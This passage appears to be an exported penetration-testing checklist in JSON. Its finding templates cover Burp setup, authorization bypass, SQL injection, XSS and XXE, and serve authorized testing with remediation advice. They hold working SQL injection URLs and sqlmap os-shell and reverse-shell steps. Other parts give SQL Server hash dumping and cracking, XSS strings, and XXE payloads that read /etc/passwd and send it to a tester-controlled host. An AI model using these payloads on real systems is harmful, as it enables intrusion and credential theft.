&gt; Session Handling Rules</p></li><li><p>Click Add and give the rule a description or name such as &quot;Refresh session.&quot;</p></li><li><p>Under Rule Actions &gt; Add &gt; Select &quot;Check Session is Valid&quot; from the drop down</p></li><li><p>In the pop up window, leave &quot;Issue current request&quot; selected</p></li><li><p>Check &quot;Validate Session every X requests&quot;</p></li><ol><li><p>This can be altered later if the session isn't being refreshed often enough</p></li></ol></ol><p>Next, select the appropriate location in the request for Burp to search for clues whether the session is valid or not. This requires knowing how the application responds to an expired session. You can figure this out either by making an authenticated request without cookies/auth headers, letting the session expire and submitting an old request, or logging out and submitting an old request. Configure the expression to match as uniquely as possible with the response without being too large. Use a simple string match and case sensitive match if possible to reduce the processing time.</p><p>Configure behavior dependent session validity section:</p><ol><li><p>The &quot;If session is valid...&quot; box will be automatically checked and greyed out</p></li><li><p>Check the &quot;If session is invalid...&quot; box and leave Run a macro in the drop down</p></li><li><p>Select the macro from earlier steps</p></li><li><p>Configure the options for updating based on the response. Typically this only involves unchecking the &quot;Update current request parameters...&quot; and finish by clicking OK</p></li><li><p>Click the Scope tab &gt; select all tools you'd like to have a sessions refreshed automatically (typically everything except Proxy).</p></li><li><p>Under the URL Scope section, select Use Suite Scope and click OK.</p></li></ol>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": true,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 1,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "fbc5a06d-237b-4a45-897b-21e057c2eea1",
						"name": "Application Content Discovery* ",
						"instructions": "<h3>Instructions:</h3><p>Content discovery is finding directories and/or files that are not necessarily linked within the application. This discovery is done through brute force guessing and can be accomplished by various tools.</p><p><strong><span style=\"color: #DB2719\">&#42;Make a comment on this task of the wordlists or methods used for this task.</span></strong></p><h3>Methods:</h3><p><strong>Burp Suite - Content Discovery:</strong></p><ol><li><p>Open Burp to Target -&gt; Site Map.</p></li><li><p>Right click on the top level site.</p></li><li><p>Select Engagement tools -&gt; Discover content.</p></li></ol><p><strong>Burp Suite - Intruder:</strong></p><ol><li><p>Send a request from the proxy to Intruder</p></li><li><p>Use either the default Burp Suite Directories payload list or <a href='https://github.com/fuzzdb-project/fuzzdb'>download FuzzDB</a> and use the directories payload list. Note: This likely will get caught by AV unless it's saved in C:\\tools (or /Users/{username}/tools on Mac).</p></li></ol><h3>Additional Methods (Optional):</h3><p><strong>AutoDirbuster</strong></p><ol><li><p>Check the <a href='https://github.com/NetSPI/AutoDirbuster'>NetSPI Github</a> page for the latest installation and usage instructions</p></li></ol><p><strong>Nikto</strong></p><ol><li><p><a href='https://cirt.net/nikto2'>Run nikto</a> from the command line with the -h flag, providing the URL of the web application.</p></li></ol>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": true,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 2,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "c89502ab-1362-4b24-8c62-7bfde3b25e26",
						"name": "Verification of Automated Scan Results",
						"instructions": "<h3>Instructions:</h3><ul><li><p>Review the results of automated applications scans</p></li><li><p>Import relevant files into Sources</p></li><li><p>Validate any findings for true and false positives</p></li></ul>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 3,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "4072a207-d2f6-4ad6-b205-315bc10a5e45",
						"name": "Burp Findings and Artifact Files*",
						"instructions": "<h3>Instructions:</h3><p>There are <strong>two separate files</strong> that must be uploaded to Burp during a standard WAPEN: the <strong><span style=\"color: #DB2719\">Burp findings</span></strong> file which is an .xml file, and the <strong><span style=\"color: #DB2719\">Burp project </span></strong>file which is a .zip file.</p><p>Note: A comment on this item is mandatory in order for it to be checked Complete or NA. Either way, a comment will need to be added to affirm the presence or justify the absence of either of these files.</p><h3>Burp Findings (Sources):</h3><p>After all Burp scanning is complete, the findings that Burp has reported should be imported into Resolve.</p><ol><li><p>Do not FP findings within Burp; it is better to import all findings from Burp into Resolve and then FP there if necessary.</p></li><li><p>Within Burp &gt; Target &gt; Site map &gt; Right-click the in scope host(s) &gt; Issues &gt; and select Report Issues for this host.</p></li><ol><li><p>Export data as XML; Uncheck Base64 request/responses</p></li><li><p>Continue to click Next until the .xml file has been saved locally</p></li></ol><li><p>Within Resolve &gt; Sources &gt; click Add Data Source and upload the Burp .xml file.</p></li></ol><h3>Burp Project File (Artifacts):</h3><ol><li><p>When a project is ready for QA, close Burp and compress the Burp project file with zip.</p></li><li><p>Upload the zip file to the project workspace, using the Artifact upload feature.</p></li><ol><li><p>Note: In Platform there is no Artifacts tab, the Documents tab should be used and the Artifact marked <strong>Internal.</strong></p></li></ol><li><p>After QA completes and the project is delivered, the Burp project file and zip can be deleted from your local storage.</p></li></ol>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": true,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 4,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "212ff089-e0a0-4158-b8f8-2417f6d91d0e",
						"name": "Authorization Bypass Scan (Auth Analyzer)",
						"instructions": "<h3><strong>Instructions:</strong></h3><p>After crawling through all application functionality, run the Burp <strong>Auth Analyzer</strong> extension to identify authorization bypass issues. Review the results and add findings accordingly.</p><ul><li><p>one Auth Analyzer tab with no cookies to identify anonymously accessible pages</p></li><li><p>two separate Auth Analyzer tabs with different user roles</p></li><li><p>one Auth Analyzer tab with a header that includes <code>Authorization: Bearer X</code> (if applicable)</p></li></ul><h3><strong>Artifact:</strong></h3><p>Export the Auth Analyzer output and upload it to the Documents (internal) tab as an artifact for the test.</p><p>Alternatively, if running Auth Analyzer doesn't make sense for your app or authZ tests were done manually, please include a verbose comment stating that information.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 5,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "d24b0663-9ca3-4b8a-a630-6a201f73bd31",
						"name": "Link Finder",
						"instructions": "<h3><strong>Instructions:</strong></h3><p>This task is to be completed after Burp has a comprehensive coverage of the application in the Target tab.</p><p>Within Burp, review the results of the \"JS Link Finder\" extension to identify endpoints that have not been tested during assessment. If the identified endpoints can be accessed, and are in scope, include them to the testing process.</p><h3><strong>Additional Instructions (optional):</strong></h3><p>It is also possible to use Piper + LinkFinder.</p><p>See <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://outline.netspi.com/doc/lunch-burp-1-jSMCbGKBaV#h-piper-linkfinder-a-deadly-combo\">the Outline page about this topic</a> for more information.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 6,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "df6a4e29-dc5a-4f32-a5ca-34a7927d9ee5",
						"name": "401/403 Authorization Bypass Scanning",
						"instructions": "<p>Perform the following if time permits.</p><h3><strong>Instructions:</strong></h3><ol><li><p>Using Burp, browse and map the application as usual.</p></li><li><p>Use the Search functions to identify interesting forbidden or unauthorized requests (returned a 401 or 403 response error)</p></li></ol><p>        Such as (not limited to):</p><p>            - When hunting for IDORs</p><p>            - Trying to access admin pages with a low privilege or unauthenticated session.</p><p>            - performing unauthorized actions in an application or API</p><p>3. Copy the request from Burp and put it into <code>request.txt</code></p><p>4. Feed the request into BypassFuzzer (<a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://github.com/NetSPI/BypassFuzzer\">https://github.com/NetSPI/BypassFuzzer</a>).</p><p><code>python3 bypassfuzzer.py -r request.txt --smart</code></p><p>              Read the README for helpful usage tips</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 21467,
							"uid": "68583868-a8cc-dd11-ad4a-001e4f120030",
							"name": "Authorization Bypass - Parameter Manipulation",
							"description": "<p>The application does not perform adequate authorization checks. An authenticated user can gain unauthorized access to sensitive information or functionality by manipulating specific parameters within the application.</p>",
							"severityId": 3,
							"businessImpact": "<p>An authenticated user could gain unauthorized access to sensitive data or functionality within the application. The impact of a user bypassing authorization checks depends on the nature of the application as well as the data that is accessed.</p>",
							"sourceIdentifier": "M:21468",
							"verificationInstructions": "",
							"references": "<ul><li>https://www.owasp.org/index.php/Guide_to_Authorization</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Ensure that strong access controls are in place to prevent unauthorized access to sensitive information and functionality.  Authorization checks should be performed prior to providing users access to web pages, information, and functionality within the application.  Any part of the application that relies on user input to return data should perform server side authorization checks. Do not rely on authorization checks that are performed client side, as the client may be able to manipulate and bypass these checks.  Ensuring that server side authorization checks are in place will help prevent users from gaining unauthorized access to sensitive data and functionality within the application.</p>"
						},
						"ordinal": 7,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "efde6fb0-f1f7-4a01-b71e-dbbeac3fea7b",
						"name": "Platform Automated Authenticated Scanning",
						"instructions": "<h1><span style=\"color: red\"><strong>NOTE: This is not available quite yet. Deployment of this feature expected on Aug 11, 2025.</strong></span></h1><h3><strong>Prerequisite Instructions:</strong></h3><ol><li><p>Create a new Workspace to hold the results of the automated scan. </p></li><li><p>Go to the Credentials tab and add new Username/Password credential set.</p></li><li><p>Go to the Jobs tab within the engagement and select \"Start Scan.\"</p></li><li><p>In the New Scan window, leave the IP/Domain field blank and select the <code>Web Authenticated Burp Suite Workflow</code>.</p></li><li><p>Choose the new Workspace created in Step #1 and click \"Create Workflow.\"</p></li></ol><h3><strong>Scan Instructions:</strong></h3><ol><li><p>Under the Workflow Details, choose the credentials created in Step #2.</p></li><li><p>Enter the Scan Start URL - this should be one URL per line.</p><ol><li><p>Add any out-of-scope prefixes if applicable.</p></li></ol></li><li><p>Leave Scheduled unchecked - this is for continuous testing</p></li></ol><p>Note: This is for WAPens only (not for APIPen yet).</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 8,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 3,
				"collapsed": true
			},
			{
				"uid": "27584ffe-1641-42ca-8bf6-1687b42a1b04",
				"name": "Injections - Common",
				"description": "The injection category is intended for common injections that can affect any endpoint of the application. The category serves as a reminder of possible injections, and also has correct findings linked to them.",
				"type": 2,
				"tasks": [
					{
						"uid": "f7455e04-800b-4519-9f46-b95dc711c12f",
						"name": "SQL Injection",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 877,
							"uid": "0c37944e-03b1-dd11-992f-001e4f120030",
							"name": "SQL Injection",
							"description": "<p>SQL injection is a method of attack that takes advantage of input variables that have not been validated, thus allowing the manipulation of SQL queries processed by the backend database server. It is often presented in web-based forms, queries within URLs, and XML requests.</p>",
							"severityId": 3,
							"businessImpact": "<p>SQL injection may allow an attacker to extract, modify, add, or delete information from database servers, causing the confidentiality and integrity of the information stored in the database to be compromised.</p><p>Depending on the SQL implementation, the attacker may also be able to execute system commands on the affected host. In some circumstances, this provides the means to take control of the server hosting the database, leading to the complete compromise of the confidentiality, integrity, and availability of the affected host.</p>",
							"sourceIdentifier": "GID:2851",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>Use SQLMap to extract data and to prove if operating system command execution is possible. Typical use:</p><p>python sqlmap.py -u http://site/search.asp?id=1&amp;name=2 -p id --dbms=dbtype --sql-shell</p><p>python sqlmap.py --help for all sqlmap options (such as --os-shell).</p><p>Manually test SQL injections on the affected parameters. Good injection strings include \"'\", \";\" and \"--\". If the web server behaves unexpectedly (error messages, unexpected results etc.), try to create queries that get successfully executed on the server. If necessary, consult your coworkers.</p><p>A good verification for SQL injection proves data extraction, proves that injected queries were successfully executed, and/or possible command execution. </p><p>---------------------------------------------------------------------------------------------------------------------</p><p>Union Select - Example - 1</p><p>http://www.store.com/id=1+union+select+null,null,name,null+from+master..sysdatabases;--</p><p>Error Based - Example - 1</p><p>http://www.store.com/id=cast(@@version+as+int);--</p><p>Blind Example - Example -1 - Time Based</p><p>http://www.store.com/id=1';WAITFOR+DELAY+'00:00:10';--</p><p>Blind Example - Example -1 - Send Email</p><p>http://www.store.com/id=1';exec+master..sp_sendmail+'',@query='select+system_user';--</p><p><strong>Reporting Requirements</strong></p><ol><li><p>Add screenshot of the initial page</p></li><li><p>Add screenshot of the initial request</p></li><li><p>Add screenshot for modified request that is used to identify the injection (such as single quote causing an error message)</p></li><li><p>Add sample injections (whole request not necessary) and show how data was enumerated</p></li><li><p>Show the level of access</p></li></ol><p><strong>Further Testing</strong></p><p>Test for additional findings that can be identified via SQL injection:</p><ul><li><p>Insufficient Egress Filtering</p></li><li><p>Cleartext sensitive data in database</p></li><li><p>Excessive permissions for database user, service account, and links</p></li></ul><p><strong>References</strong></p><p>SQL Injection wikis - https://github.com/NetSPI/</p><p><strong>Tools</strong></p><p>sqlmap - http://sqlmap.org/</p>",
							"references": "<ul><li>http://msdn2.microsoft.com/en-us/library/ms161953.aspx</li><li>http://www.owasp.org/index.php/Blind_SQL_Injection</li><li>https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html</li><li>https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html</li><li>https://owasp.org/www-community/attacks/SQL_Injection</li></ul>",
							"exploitInstructions": "<p>------------------------------------------------------------------------------------------</p><p>Verify sysadmin access</p><p>------------------------------------------------------------------------------------------ </p><p>#1 Determine if the user is a sysadmin</p><p>select is_srvrolemember('sysadmin')</p><p>------------------------------------------------------------------------------------------</p><p>Verify sysadmin access</p><p>------------------------------------------------------------------------------------------ </p><p>#1 Use 'waitfor '00:00:10'; in the injection for a screenshot</p><p>#2 Take screenshot of response</p><p>------------------------------------------------------------------------------------------</p><p>Obtain a shell on the system</p><p>------------------------------------------------------------------------------------------ </p><p>#1 Open Kali</p><p>#2 Open a console to sqlmap</p><p>#3 Get a command console with the following command:</p><p>Note: requires sysadmin access.</p><p>python sqlmap.py -u <http://www.acme.com?id=1> --os-shell</p><p>#4 Use access to send a Metasploit meterpreter reverse shell over port 443 or 53.</p><p>Note: this will require that a metasploit listener is setup.</p><p>------------------------------------------------------------------------------------------</p><p>Instructions Dumping and Cracking SQL Passwords</p><p>------------------------------------------------------------------------------------------ </p><p>#1 - Obtain SQL Server password hashes via sqlmap --sql-shell</p><p>SQL Server 2000</p><p>select name,password_hash from sysxlogins;</p><p>SQL Server 2005/2008</p><p>select name,password_hash from sys.sql_logins;</p><p>#2 - Parse the hashes</p><p>first 6 = padding</p><p>next 8 = salt</p><p>next 40 = mixed case hash</p><p>#3 - Open Cain and navigate to the Cracker tab</p><p>#4 - Click MSSQL Hashes and click in the main MSSQL hashes window</p><p>#5 Click the + button to add the hash</p><p>#6 Choose mixed case dictionary attack</p><p>#7 If #6 fails, Choose mixed case brute force</p><p>Reference</p><p>http://hkashfi.blogspot.com/2007/08/breaking-sql-server-2005-hashes.html</p>",
							"remediationInstructions": "<p>Employ a layered approach to security that includes using parameterized queries when accepting user input. Strictly define the data type (for instance, a string, an alphanumeric character, etc.) that the application will accept and harden the database server to prevent data from being accessed inappropriately. Also, ensure that all data used by the application is put through a data input filter that removes potentially harmful characters. Best practice recommends the use of allowlists using regular expressions.</p><p>Disable detailed error messages that could give an attacker information about database names, table names, versions and type of databases being used. Replace the error message with a generic error asking the user to contact the IT department or send an e-mail to the web administrator.</p><p>A non-privileged service account should be used to run the database server, and the database user in use should not have administrative privileges to the database. Following the principle of least privilege when assigning permissions for the service account and database user helps limit the impact of a successful SQL injection attack.</p>"
						},
						"ordinal": 0,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "cd6f9d0b-f23d-4dce-9c0f-57791c875de3",
						"name": "Cross-Site Scripting - Reflected",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 709,
							"uid": "ef34944e-03b1-dd11-992f-001e4f120030",
							"name": "Cross-Site Scripting - Reflected",
							"description": "<p>Cross-site scripting occurs when dynamically generated web pages display user input that is either improperly validated or not validated at all. This allows attackers to embed malicious script code into the generated page, which is then executed in the browser of the user viewing the page.</p><p>Cross-site scripting poses risks that include, but are not limited to, the following:</p><ul><li><p>Users can unknowingly execute malicious scripts when viewing dynamically generated pages based on content provided by an attacker.</p></li><li><p>An attacker can take over a user's session before the user's session cookie expires.</p></li><li><p>An attacker can connect users to a malicious server of the attacker's choice.</p></li><li><p>An attacker who can convince a user to access a URL supplied by the attacker could cause script or HTML of the attacker's choice to be executed in the user's browser. Using this technique, an attacker can take actions with the privileges of the user who accessed the URL.</p></li></ul>",
							"severityId": 2,
							"businessImpact": "<p>Successful exploitation of cross-site scripting vulnerabilities allows an attacker to run arbitrary script code in the context of the affected user. This can be used to compromise the integrity of content returned by the web server to take over a user's session, redirect the user to a malicious web site, or send requests on behalf of a user. Stolen sessions can be used to take any action the affected user could within an application.  Redirecting users to malicious web sites could be used to propagate malware, discredit the original web site, or trick users into disclosing sensitive information. Sending malicious requests on behalf of an affected user can make it difficult to discover the true origin of the attack.</p>",
							"sourceIdentifier": "GID:3163",
							"verificationInstructions": "<h3><strong>Verification Instructions:</strong></h3><p>Attempt to exploit cross-site scripting by injecting JavaScript into application parameters (usually something like a parameter that contains <code>&lt;script&gt;alert(1234)&lt;/script&gt;</code>). This can usually be obtained from the tool that identified the finding; cross-site scripting identification is mainly done by automated tools.</p><p>Manually verify what kind of input filtering the application does. Attempt to obfuscate injections to avoid detection by filters (see references).</p><p><strong>Typical XSS vulnerabilities:</strong></p><ul><li><p>Standard &lt;script&gt; tag injection - <code>&lt;script&gt;alert(123)&lt;/script&gt;</code></li><li><p>Injection into existing JavaScript - <code>&quot;;alert(123);//</code></li><li><p>Injection into input tags - use JavaScript event trigger such as <code>onmouseover=alert(123)</code></li></ul><h3><strong>Reporting Requirements:</strong></h3><ol><li><p>Add screenshot of the initial page</p></li><li><p>Add text based HTTP request/response of the request with XSS payload. Use a modified HTTP request block if necessary.</p></li><li><p>Add screenshot of JavaScript executing in browser</p></li></ol><h3>Alternatives:</h3><p>If you are able to add HTML tags, but not exploit XSS, add the finding for <u>HTML Tag Injection</u>.</p><p>If you have self-XSS, include this finding but downgrade to <strong>LOW</strong> and include details in the Description.</p><p>If the XSS source is a Cookie, and there are no other vulnerabilities that can be chained to set the cookie to the payload, this should be downgraded to Low similarly to self-XSS. </p>",
							"references": "<ul><li>https://owasp.org/www-community/attacks/xss/</li><li>https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)</li><li>https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>The following recommendations will help reduce the risk of cross-site scripting attacks:</p><ul><li><p>Validate the input only contains a set of expected characters such as digits and dashes in a phone number.</p></li><li><p>Reject requests that fail input validation rather than attempting to fix or clean them.</p></li><li><p>Context-specific encoding should be applied before the data is written to the page. For example, HTML-encoding for user-submitted data reflected in HTML and JavaScript escaping for user-submitted data reflected in JavaScript.</p></li><li><p>Ensure that the application code on the server validates all input locations (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. Allowlisting should be used as the base validation method of user input; blocklisting can be used as an additional layer of protection.</p></li><li><p>Many web frameworks can provide built in methods to convert input data into correct, non-interpretable HTML. These libraries should be used to sanitize all input before displaying it to the client.</p></li><li><p>Consider the use of a Content-Security-Policy (CSP) which is a response header that instructs the user client on what resources to load.</p></li></ul>"
						},
						"ordinal": 1,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "cc85fd52-4d5c-4903-9537-66c573fd3af4",
						"name": "Cross-Site Scripting - Persistent",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 21825,
							"uid": "93d83c76-f2e7-dd11-8199-001e4f12001c",
							"name": "Cross-Site Scripting - Persistent",
							"description": "<p>Cross-site scripting occurs when dynamically generated web pages display user input that is either improperly validated or not validated at all. This allows attackers to embed malicious script code into the generated page, which is then executed in the browser of the user viewing the page. Persistent cross-site scripting occurs when the malicious script is stored in a database by the application, and then executed whenever another user views a page that displays that malicious data.</p><p>Cross-site scripting poses risks that include, but are not limited to, the following:</p><ul><li><p>Users can unknowingly execute malicious scripts when viewing dynamically generated pages based on content provided by an attacker.</p></li><li><p>An attacker can take over a user's session before the user's session cookie expires.</p></li><li><p>An attacker can connect users to a malicious server of the attacker's choice.</p></li><li><p>An attacker who can convince a user to access a URL supplied by the attacker could cause script or HTML of the attacker's choice to be executed in the user's browser. Using this technique, an attacker can take actions with the privileges of the user who accessed the URL.</p></li></ul><p>In this case, the cross-site scripting vulnerability is persistent; once the malicious code is injected, it will be executed on every client's web browser when the user accesses the compromised web page.  Please note that the affected URLs listed in this finding may not represent every instance of the vulnerability.  For higher assurances that all instances of the vulnerability are found, conduct a secure code review.</p>",
							"severityId": 3,
							"businessImpact": "<p>Successful exploitation of cross-site scripting vulnerabilities allows an attacker to run arbitrary script code in the context of the affected user. This can be used to compromise the integrity of content returned by the web server to take over a user's session, redirect the user to a malicious web site, or send requests on behalf of a user. Stolen sessions can be used to take any action the affected user could within an application.  Redirecting users to malicious web sites could be used to propagate malware, discredit the original web site, or trick users into disclosing sensitive information. Sending malicious requests on behalf of an affected user can make it difficult to discover the true origin of the attack.</p>",
							"sourceIdentifier": "M:21825",
							"verificationInstructions": "<h3><strong>Verification Instructions:</strong></h3><p>Attempt to exploit cross-site scripting by injecting JavaScript into application parameters (usually something like a parameter that contains <code>&lt;script&gt;alert(1234)&lt;/script&gt;</code>). This can usually be obtained from the tool that identified the finding; cross-site scripting identification is mainly done by automated tools.</p><p>Manually verify what kind of input filtering the application does. Attempt to obfuscate injections to avoid detection by filters (see references).</p><p>Typical XSS vulnerabilities:</p><ul><li><p>Standard &lt;script&gt; tag injection - <code>&lt;script&gt;alert(123)&lt;/script&gt;</code></li><li><p>Injection into existing JavaScript - <code>&quot;;alert(123);//</code></li><li><p>Injection into input tags - use JavaScript event trigger such as <code>onmouseover=alert(123)</code></li></ul><h3><strong>Reporting Requirements:</strong></h3><ol><li><p>Add an explanation about the persistent XSS: when is the XSS executed and which users it affects (self XSS or other users of the app too)</p></li><li><p>Add screenshot of the initial page</p></li><li><p>Add text based HTTP request/response of the request with XSS payload. Use a modified HTTP request block if necessary.</p></li><li><p>Add screenshot of JavaScript executing in browser</p></li></ol><h3><strong>References:</strong></h3><p>XSS Filter Evasion Cheatsheet - https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</p><p>PortSwigger XSS Cheatsheet - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</p>",
							"references": "<ul><li>https://owasp.org/www-community/attacks/xss/</li><li>https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>The following recommendations will help reduce the risk of cross-site scripting attacks:</p><ul><li><p>Validate the input only contains a set of expected characters such as digits and dashes in a phone number.</p></li><li><p>Reject requests that fail input validation rather than attempting to fix or clean them.</p></li><li><p>Context-specific encoding should be applied before the data is written to the page. For example, HTML-encoding for user-submitted data reflected in HTML and JavaScript escaping for user-submitted data reflected in JavaScript.</p></li><li><p>Ensure that the application code on the server validates all input locations (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. Allowlisting should be used as the base validation method of user input; blocklisting can be used as an additional layer of protection.</p></li><li><p>Many web frameworks can provide built in methods to convert input data into correct, non-interpretable HTML. These libraries should be used to sanitize all input before displaying it to the client.</p></li><li><p>Consider the use of a Content-Security-Policy (CSP) which is a response header that instructs the user client on what resources to load.</p></li></ul>"
						},
						"ordinal": 2,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "1e284674-6147-4420-8a14-9e7a2bbaaf58",
						"name": "XML External Entity Injection",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 5050649,
							"uid": "392f499a-411d-e211-b92d-001e4f120032",
							"name": "XML External Entity Injection",
							"description": "<p>External Entities and external document type definitions allow referencing resources outside the main file into an XML document. When an XML processor recognizes a reference to an external entity to validate the document, it may include the entity's replacement text.  Attacks targeting this behavior are commonly referred to as XML External Entity (XXE) attacks.</p><p>An attacker could, by including user-controlled external entity in the XML request:</p><ul><li><p>Force the XML processor to read arbitrary files on the remote system</p></li><li><p>Force the XML processor to connect to external systems</p></li><li><p>Craft a malicious XML bomb with nested entities to consume server's resources, causing Denial of Service conditions</p></li></ul>",
							"severityId": 3,
							"businessImpact": "<p>Successful exploitation of the vulnerability may allow an unauthorized user to read arbitrary files on the affected system, resulting in the compromise of confidentiality. Exploitation may lead to disclosure of confidential information, as well as reveal sensitive information that can be used in further attacks against the target system.</p>",
							"sourceIdentifier": "M:392f499a-411d-e211-b92d-001e4f120032",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>Attempt to inject DOCTYPE definitions to XML-based requests (SOAP or RESTful). DOCTYPE must be defined before the XML body. Reference to external entity: &amp;entity;</p><p>XXE can also be found in XML formatted GET and POST parameters and the same instructions can be followed to identify XXE. XXE is quite common in SAML tokens.</p><p>Sample: </p><p>&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY</p><p>test SYSTEM \"http://www.test.com/test.txt\"&gt;&lt;!ELEMENT foo ANY&gt;]&gt;</p><p>&lt;xml start&gt;</p><p>..</p><p>&lt;foo&gt;&amp;test;&lt;/foo&gt;</p><p>..</p><p>&lt;xml ends&gt;</p><p>It is not necessary to define the element, external entity references can be used within existing elements.</p><p>If injection possible, attempt to</p><ul><li><p>Read local files (entity reference file:///etc/passwd or c:\\windows\\win.ini)</p></li><li><p>Attempt to connect back to the pentest lab environment and capture possible NTLM handshake with responder (entity reference http://&lt;pentestExternalIP&gt;/test or \\\\&lt;pentestExternalIP&gt;\\test on Windows systems)</p></li></ul><p>If outbound connectivity, external DTD can be hosted at the pentest lab.</p><p>Sample entity injection:</p><p>&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;</p><p> &lt;!DOCTYPE foo SYSTEM \"http://&lt;pentestExternalIP&gt;/test.dtd\"&gt;]&gt;</p><p>Hosted test.dtd file content:</p><p>&lt;!ENTITY % payload SYSTEM \"file:///etc/passwd\"&gt;</p><p>&lt;!ENTITY % param1 '&lt;!ENTITY &amp;&#35;37; external SYSTEM</p><p>\"http://&lt;pentestExternalIP&gt;/x=&#35;%payload;\"&gt;'&gt; %param1; %external;</p><p>Invalid URL (x=&#35;) is used to force error messages on SAX parser. It may not be necessary. Instead, file contents may be available on .216 in Apache access logs. % is used to create parameter entities; they are used inside DOCTYPE definition rather than the XML body.</p><p>Entity injection has limited file read capabilities. XML tags and ampersands in files to be read break XML parsing and thus cannot typically be read. It may be possible to read XML files if a) outbound connectivity and b) reflection point for file read is found. I have no instructions at the moment... experiment.</p><p><strong>Reporting Requirements</strong></p><ol><li><p>Add a screenshot of the original request</p></li><li><p>Show the XXE injected to the request</p></li><li><p>Show file content enumeration or external connection to pentest lab system</p></li></ol><p><strong>Further Testing</strong></p><p>Test for additional findings that can be identified via XXE injection:</p><ul><li><p>Insufficient Egress Filtering - report if HTTP or SMB connectivity to pentest lab servers (or Collaborator)</p></li><li><p>Cleartext passwords in files - report if file include used to gain access to cleartext credentials</p></li><li><p>Excessive Privileges - Service Account - report on Windows if possible to connect to \\\\localhost\\c$\\windows\\win.ini</p></li></ul><p><strong>ADDITIONAL INSTRUCTIONS</strong></p><p><strong><u>ERROR Based Injection using DTD</u></strong></p><p><strong><em>Verification Summary</em></strong></p><p>1. Add firewall exception for the client's IPs.</p><p>2. Inject external DTD reference that points to pentest lab servers/files.</p><p>4. Sniff incoming traffic and parse Apache logs.</p><p><strong><em>Firewall Exception Details</em></strong></p><p>The first thing you'll need to do is add an exception on the data exfiltration firewall for the client outbound IPs.  To do that follow the basic instructions below.</p><p>1. Log into the pentest firewall location </p><p>2. Start monitoring traffic to look for incoming traffic.</p><p>Diagnostics -&gt; Packet Capture</p><p>3. Initiate the XML injection.</p><p>4. Stop and review the IPs from the capture, identify the client IP, and add the IP addresses to the pentest alias.</p><p>Firewall -&gt; Aliases -&gt; Edit -&gt; + button -&gt; Add IP and Comment -&gt;Press Save -&gt; Press Apply Changes</p><p><strong><u>Inject External DTD Reference</u></strong></p><p><strong><em>Below is an example request</em></strong></p><p>POST /test HTTP/1.1</p><p>Host: someserver.test.com</p><p>Accept: application/json</p><p>Content-Type: application/xml</p><p>Content-Length: 137</p><p>&lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt;</p><p>&lt;!DOCTYPE foo SYSTEM 